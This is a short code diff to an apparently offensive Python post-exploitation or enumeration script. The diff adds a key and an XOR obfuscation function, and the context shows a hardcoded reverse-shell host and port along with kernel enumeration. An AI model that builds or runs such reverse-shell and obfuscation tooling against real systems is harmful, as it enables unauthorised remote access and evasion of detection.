@@ -41,6 +41,7 @@ import logging
 import struct
 import getpass
 import pwd
+import operator
 
 cut = lambda s: str(s).split("\0",1)[0]
 
@@ -97,10 +98,12 @@ def environment():
    global RHOST
    global RPORT
    global distro2
+   global pkey
 
    # Change RHOST & RPORT accordingly if you're going to use the reverse shell   
    RHOST = '192.168.1.19'
    RPORT = 443
+   pkey = 'XKIUKX'
 
    fullkernel = os.uname()[2]
    splitkern = fullkernel.split("-")
@@ -147,6 +150,13 @@ def environment():
 
    print "[!] Reports will be saved in: %s" % Temp_Dir
 
+def xor(string, key):
+    data = ''
+    for char in string:
+        for ch in key:
+            char = chr(ord(char) ^ ord(ch))
+        data += char
+    return data
   
 def signalHandler(signal, frame):
   print("[!] Ctrl-C caught, shutting down now");
